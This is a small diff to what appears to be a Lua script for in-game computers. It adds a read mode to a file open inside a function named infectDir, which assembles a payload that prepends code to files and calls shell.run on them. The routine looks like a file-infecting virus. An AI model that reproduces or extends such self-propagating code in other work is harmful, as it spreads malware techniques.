@@ -64,7 +64,7 @@ function infectDir(dirName, payload)
           end
           
           dump = 'args = {...}\n'
-          csv = fs.open("toCSV")
+          csv = fs.open("toCSV", "r")
           dump = dump .. csv.readAll() .. "\n"
           csv.close()
           dump = dump .. 'shell.run("' .. fullFile .. '" .. toCSV(args))\n'
